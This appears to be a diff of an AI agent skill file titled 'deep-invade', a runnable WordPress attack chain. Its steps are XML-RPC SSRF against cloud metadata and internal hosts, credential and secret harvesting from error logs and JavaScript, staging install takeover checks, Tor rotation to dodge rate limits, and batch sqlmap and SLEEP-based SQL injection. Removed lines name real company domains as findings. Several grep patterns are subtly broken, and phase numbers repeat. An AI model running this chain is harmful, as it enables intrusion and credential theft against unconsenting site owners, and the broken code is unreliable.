@@ -1,26 +1,24 @@
 ---
 name: deep-invade
 description: Deep pentest WP: SSRF, plugin CVE, JS mine, port scan chain.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, pentest, deep, SSRF, CVE, wordpress]
-    category: recon
-    related_skills:
-      - wp-mass-recon
-      - xmlrpc-exploitation
-      - error-log-mining
-      - js-secrets-extraction
-      - staging-subdomain-hunt
-      - wordpress-plugin-hunt
-      - port-service-discovery
-      - cors-credential-wordpress
-      - source-leak-hunt
-      - phpinfo-to-rce
+compatibility: Requires curl, nmap, python3, httpx, nuclei
+tags: [recon, pentest, deep, SSRF, CVE, wordpress]
+category: recon
+related_skills:
+  - wp-mass-recon
+  - xmlrpc-exploitation
+  - error-log-mining
+  - js-secrets-extraction
+  - staging-subdomain-hunt
+  - wordpress-plugin-hunt
+  - port-service-discovery
+  - cors-credential-wordpress
+  - source-leak-hunt
+  - phpinfo-to-rce
 ---
 
 # Deep Invade Skill
@@ -36,7 +34,7 @@ Comprehensive deep pentest methodology for targets flagged as high-value by wp-m
 
 ## Prerequisites
 
-- `terminal` tool on the worker container.
+- `terminal` tool access on the worker container.
 - Target already scored >= 6 from wp-mass-recon (WordPress confirmed, at least 2 of: CORS/XMLRPC/source leak).
 - Collaborator endpoint (Burp Collaborator, interactsh, or your own server) for SSRF/blind confirmation.
 - `nmap` available on the worker for port scanning.
@@ -69,11 +67,11 @@ Execute probes in order. Each phase builds on the previous:
 
 | Wave | New Capability | Key Discovery |
 |------|---------------|---------------|
-| 5 | Staging discovery, JS bundles, SliderRev REST | staging.biglots.com with 25 REST namespaces |
+| 5 | Staging discovery, JS bundles, SliderRev REST | staging.retail.example.com with 25 REST namespaces |
 | 6 | SSRF confirmation, CORS matrix, plugin namespaces | 15 IMDS paths all faultCode 0 on staging |
-| 7 | IMDS role guessing, Yoast sitemap, JS secrets | Google API key found in patientportal JS |
-| 8 | WP install pages, Elementor 500, backup files | staging.biglots.com install.php HTTP 200 |
-| 9 | Pattern catalog, cross-wave synthesis, regression tracking | MySQL+FTP+IMAP opened on wines.com, Exchange+VPN on realpro.com |
+| 7 | IMDS role guessing, Yoast sitemap, JS secrets | Google API key found in health-saas.example.com JS |
+| 8 | WP install pages, Elementor 500, backup files | staging.retail.example.com install.php HTTP 200 |
+| 9 | Pattern catalog, cross-wave synthesis, regression tracking | MySQL+FTP+IMAP opened on ecommerce.example.com, Exchange+VPN on realestate.example.com |
 
 ## Procedure
 
@@ -86,7 +84,7 @@ COLLAB="$2"  # Your Burp Collaborator / interactsh URL
 echo "[*] Phase 1: SSRF Probe"
 
 # Test 1: Confirm pingback SSRF to your callback
-curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
   -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
 <params><param><value><string>$COLLAB</string></value></param>
 <param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" | grep faultCode
@@ -100,26 +98,28 @@ for path in "" "iam/security-credentials/" "iam/security-credentials/admin" \
   "network/interfaces/macs/" "security-groups" "ami-id" "hostname" \
   "instance-id" "mac" "profile"; do
 
-  result=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
+  result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
     -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
 <params><param><value><string>http://169.254.169.254/latest/meta-data/$path</string></value></param>
 <param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')
 
   code=$(echo "$result" | grep -o '[0-9]\+')
   [[ "$code" == "0" ]] && echo "[SSRF] IMDS reachable: /$path" || echo "[--]   IMDS blocked: /$path (faultCode=$code)"
+  sleep 0.5
 done
 
 # Test 3: Internal network probes
 for ip in "127.0.0.1:80" "127.0.0.1:3306" "127.0.0.1:8080" "127.0.0.1:3000" \
   "10.0.0.1:80" "172.16.0.1:80" "192.168.0.1:80" "localhost:22"; do
 
-  result=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
+  result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
     -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
 <params><param><value><string>http://$ip/</string></value></param>
 <param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')
 
   code=$(echo "$result" | grep -o '[0-9]\+')
   [[ "$code" == "0" ]] && echo "[SSRF] Internal reachable: $ip" || true
+  sleep 0.5
 done
 ```
 
@@ -131,8 +131,8 @@ TARGET="$1"
 echo "[*] Phase 2: Error Log Mining"
 
 # Fetch error_log (can be multi-MB)
-curl -sk --max-time 30 "https://$TARGET/error_log" -o /tmp/error_log_$TARGET.txt 2>/dev/null
-curl -sk --max-time 30 "https://$TARGET/wp-content/debug.log" >> /tmp/error_log_$TARGET.txt 2>/dev/null
+curl -sk --max-time 30 --connect-timeout 10 "https://$TARGET/error_log" -o /tmp/error_log_$TARGET.txt 2>/dev/null
+curl -sk --max-time 30 --connect-timeout 10 "https://$TARGET/wp-content/debug.log" >> /tmp/error_log_$TARGET.txt 2>/dev/null
 
 size=$(wc -c < /tmp/error_log_$TARGET.txt 2>/dev/null)
 
@@ -141,11 +141,11 @@ if [[ "$size" -gt 100 ]]; then
 
   # Extract server paths
   echo "[*] Server paths:"
-  grep -oP '/[a-zA-Z0-9/_.-]+\.php' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -20
+  grep -Eo '/[a-zA-Z0-9/_.-]+\.php' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -20
 
   # Extract email addresses
   echo "[*] Email addresses:"
-  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -10
+  grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -10
 
   # Extract DB credentials
   echo "[*] DB credentials:"
@@ -168,8 +168,8 @@ if [[ "$size" -gt 100 ]]; then
 
   # Date range
   echo "[*] Date range:"
-  head -1 /tmp/error_log_$TARGET.txt | grep -oP '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
-  tail -1 /tmp/error_log_$TARGET.txt | grep -oP '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
+  head -1 /tmp/error_log_$TARGET.txt | grep -Eo '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
+  tail -1 /tmp/error_log_$TARGET.txt | grep -Eo '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
 else
   echo "[-] No error log found"
 fi
@@ -202,62 +202,65 @@ PLUGINS[rankmath]="/wp-json/rankmath/v1/|SEO data|Rank Math"
 
 for plugin in "${!PLUGINS[@]}"; do
   IFS='|' read -r path cve name <<< "${PLUGINS[$plugin]}"
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET$path" 2>/dev/null)
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET$path" 2>/dev/null)
   if [[ "$code" == "200" || "$code" == "401" || "$code" == "403" ]]; then
     echo "[PLUGIN] $name ($plugin) — HTTP $code — $cve"
 
     # If 200, try to get version from readme.txt
     if [[ "$code" == "200" ]]; then
-      ver=$(curl -sk --max-time 5 "https://$TARGET/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
+      ver=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
       [[ -n "$ver" ]] && echo "         Version: $ver"
     fi
   fi
+  sleep 0.5
 done
 
 # Also probe readme.txt for elementor, revslider (common alternate paths)
 for slug in "elementor" "revslider" "js_composer" "wp-rocket" \
   "wordfence" "woocommerce" "jetpack" "litespeed-cache"; do
-  ver=$(curl -sk --max-time 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
+  ver=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
   [[ -n "$ver" ]] && echo "[VERSION] $slug: $ver"
+  sleep 0.3
 done
 ```
 
 ### Phase 4 — JavaScript Secret Extraction
 
-See `js-secrets-extraction` skill for full procedure. Quick scan:
+See `skill_view(name='js-secrets-extraction')` for full procedure. Quick scan:
 
 ```bash
 TARGET="$1"
 
 # Fetch homepage and common JS bundles
-curl -sk --max-time 10 "https://$TARGET/" -o /tmp/page_$TARGET.html 2>/dev/null
-JS_URLS=$(grep -oP 'src="[^"]+\.js[^"]*"' /tmp/page_$TARGET.html 2>/dev/null | sed 's/src="//;s/"//' | head -10)
+curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" -o /tmp/page_$TARGET.html 2>/dev/null
+JS_URLS=$(grep -Eo 'src="[^"]+\.js[^"]*"' /tmp/page_$TARGET.html 2>/dev/null | sed 's/src="//;s/"//' | head -10)
 
 for js_url in $JS_URLS; do
   # Make relative URLs absolute
   [[ "$js_url" =~ ^// ]] && js_url="https:$js_url"
   [[ "$js_url" =~ ^/ ]] && js_url="https://$TARGET$js_url"
 
-  content=$(curl -sk --max-time 10 "$js_url" 2>/dev/null)
+  content=$(curl -sk --max-time 10 --connect-timeout 10 "$js_url" 2>/dev/null)
 
   # 11 regex patterns
-  echo "$content" | grep -oP '(?:api_key|apiKey|API_KEY)["\s:=]+["'\''][A-Za-z0-9_-]{20,}'
-  echo "$content" | grep -oP 'https?://[a-zA-Z0-9.-]+\.(?:amazonaws|cloudfront)\.(?:com|net)[^"'\''\s]*'
-  echo "$content" | grep -oP 'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
-  echo "$content" | grep -oP 'AKIA[0-9A-Z]{16}'
-  echo "$content" | grep -oP '[a-z0-9-]+\.firebaseio\.com'
-  echo "$content" | grep -oP '[a-z0-9-]+\.supabase\.co'
-  echo "$content" | grep -oP 'sk_live_[0-9a-zA-Z]{24,}'
-  echo "$content" | grep -oP 'ghp_[0-9a-zA-Z]{36}'
-  echo "$content" | grep -oP 'xox[bprs]-[0-9a-zA-Z-]+'
-  echo "$content" | grep -oP '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}'
-  echo "$content" | grep -oP 'AIza[0-9A-Za-z_-]{35}'
+  echo "$content" | grep -Eo '(?:api_key|apiKey|API_KEY)["\s:=]+["'\''][A-Za-z0-9_-]{20,}'
+  echo "$content" | grep -Eo 'https?://[a-zA-Z0-9.-]+\.(?:amazonaws|cloudfront)\.(?:com|net)[^"'\''\s]*'
+  echo "$content" | grep -Eo 'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
+  echo "$content" | grep -Eo 'AKIA[0-9A-Z]{16}'
+  echo "$content" | grep -Eo '[a-z0-9-]+\.firebaseio\.com'
+  echo "$content" | grep -Eo '[a-z0-9-]+\.supabase\.co'
+  echo "$content" | grep -Eo 'sk_live_[0-9a-zA-Z]{24,}'
+  echo "$content" | grep -Eo 'ghp_[0-9a-zA-Z]{36}'
+  echo "$content" | grep -Eo 'xox[bprs]-[0-9a-zA-Z-]+'
+  echo "$content" | grep -Eo '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}'
+  echo "$content" | grep -Eo 'AIza[0-9A-Za-z_-]{35}'
+  sleep 0.3
 done | sort -u
 ```
 
 ### Phase 5 — Subdomain/Staging Discovery
 
-See `staging-subdomain-hunt` skill. Quick scan:
+See `skill_view(name='staging-subdomain-hunt')` for full procedure. Quick scan:
 
 ```bash
 TARGET="$1"
@@ -266,7 +269,7 @@ DOMAIN=$(echo "$TARGET" | sed 's|https\?://||')
 echo "[*] Phase 5: Subdomain/Staging Discovery"
 
 # crt.sh certificate transparency
-curl -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
+curl --max-time 30 --connect-timeout 10 -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
   jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u > /tmp/subs_$DOMAIN.txt
 
 sub_count=$(wc -l < /tmp/subs_$DOMAIN.txt)
@@ -280,9 +283,10 @@ grep -iE 'staging|stage|dev|test|uat|beta|old|new|admin|portal|api|app|dashboard
 echo "[*] Staging takeover check:"
 for sub in $(grep -iE 'staging|stage|dev' /tmp/subs_$DOMAIN.txt | head -5); do
   for path in "/wp-admin/install.php" "/wp-admin/upgrade.php" "/wp-admin/setup-config.php"; do
-    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$sub$path" 2>/dev/null)
+    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$sub$path" 2>/dev/null)
     [[ "$code" == "200" ]] && echo "[TAKEOVER] https://$sub$path — HTTP $code"
   done
+  sleep 0.5
 done
 ```
 
@@ -318,19 +322,21 @@ echo "[*] Phase 7: API Discovery"
 # Swagger / OpenAPI
 for path in "swagger.json" "swagger.yaml" "openapi.json" "api-docs" "api/docs" \
   "swagger-ui.html" "swagger/index.html" "api/v1/swagger.json" "v2/api-docs" "v3/api-docs"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/$path")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/$path")
   [[ "$code" == "200" ]] && echo "[API] Swagger: /$path"
+  sleep 0.3
 done
 
 # GraphQL
 for path in "graphql" "api/graphql" "gql" "query" "wp/graphql"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/$path" \
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/$path" \
     -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}')
   [[ "$code" == "200" ]] && echo "[API] GraphQL: /$path"
+  sleep 0.3
 done
 
 # WooCommerce API
-curl -sk "https://$TARGET/wp-json/wc/v3/" | python3 -c "
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/wc/v3/" | python3 -c "
 import sys, json
 try:
   data = json.load(sys.stdin)
@@ -339,7 +345,7 @@ try:
 except: pass" 2>/dev/null
 
 # Gravity Forms API
-curl -sk "https://$TARGET/wp-json/gf/v2/forms" | python3 -c "
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/gf/v2/forms" | python3 -c "
 import sys, json
 try:
   data = json.load(sys.stdin)
@@ -361,3 +367,98 @@ except: pass" 2>/dev/null
 - Error log MUST contain real PHP errors (not be a generic HTML page).
 - Plugin CVEs MUST be verified against actual version numbers from readme.txt (not just namespace presence).
 - Port scan results MUST be confirmed with banner grab (`nmap -sV`).
+
+### Phase 6 — Nuclei Vulnerability Scanning
+
+Automated CVE and misconfiguration detection across all discovered hosts:
+
+```bash
+# Scan all alive subdomains for known CVEs
+nuclei -l alive_subs.txt \
+  -t nuclei-templates/http/ \
+  -severity critical,high,medium \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -mhe 4 -rl 30 -es info \
+  -o nuclei_results.txt
+
+# Target exposure templates specifically
+nuclei -l alive_subs.txt \
+  -t nuclei-templates/http/exposures/ \
+  -o nuclei_exposures.txt
+
+# Network-level scans on discovered IPs
+nuclei -l unique_ips.txt \
+  -t nuclei-templates/network/ \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -mhe 4 -rl 30 -es info
+
+# Scan specific vulnerability classes
+for template in cves exposures misconfiguration technologies takeovers; do
+  nuclei -l alive_subs.txt \
+    -t nuclei-templates/http/$template/ \
+    -severity critical,high \
+    -o nuclei_${template}.txt
+done
+```
+
+### Phase 7 — Tor Proxy Rotation
+
+Route all scanning through Tor to defeat IP-based rate limiting on aggressive targets:
+
+```bash
+# Start Tor service
+sudo systemctl start tor
+
+# Test Tor connectivity
+curl --max-time 30 --connect-timeout 10 --socks5 127.0.0.1:9050 https://check.torproject.org/
+
+# nuclei through Tor — rotates IP every request
+nuclei -u https://target.com \
+  -p socks5://127.0.0.1:9050 \
+  -t nuclei-templates/http/
+
+# httpx through Tor  
+cat alive_subs.txt | httpx -silent -proxy socks5://127.0.0.1:9050
+
+# curl through Tor
+curl --max-time 30 --connect-timeout 10 --socks5-hostname 127.0.0.1:9050 https://target.com
+
+# Use proxychains for any command
+proxychains4 nmap -sT -Pn target.com
+proxychains4 ffuf -u https://target.com/FUZZ -w $WEB_WORDLIST
+```
+
+### Phase 8 — SQL Injection Scanning
+
+Automated SQLi detection on parameterized URLs discovered during enumeration:
+
+```bash
+# Extract parameterized URLs for SQLi testing
+cat all_urls.txt | grep "=" | sort -u > parameterized_urls.txt
+
+# sqlmap on individual endpoints
+sqlmap -u "https://target.com/page.php?id=1" --dbs --banner --batch --random-agent
+
+# From saved Burp request file
+sqlmap -r request.txt --dbs --banner --batch
+
+# Batch scanning: test all parameterized URLs
+cat parameterized_urls.txt | while read url; do
+  sqlmap -u "$url" --batch --random-agent --level 1 --risk 1 \
+    --smart --answers="follow=N,skip=Y" 2>/dev/null \
+    | grep -q "is vulnerable" && echo "VULNERABLE: $url"
+done
+
+# nuclei SQLi templates
+nuclei -l parameterized_urls.txt \
+  -t nuclei-templates/http/vulnerabilities/sql-injection/ \
+  -severity critical,high \
+  -o nuclei_sqli.txt
+
+# Time-based blind SQLi detection (non-intrusive)
+cat parameterized_urls.txt | while read url; do
+  curl -sk --max-time 5 --connect-timeout 5 "$url' AND SLEEP(5)--" \
+    -w "%{time_total}s — $url" -o /dev/null
+  echo
+done | awk '$1 > 4.5 {print "SLOW: " $0}'
+```
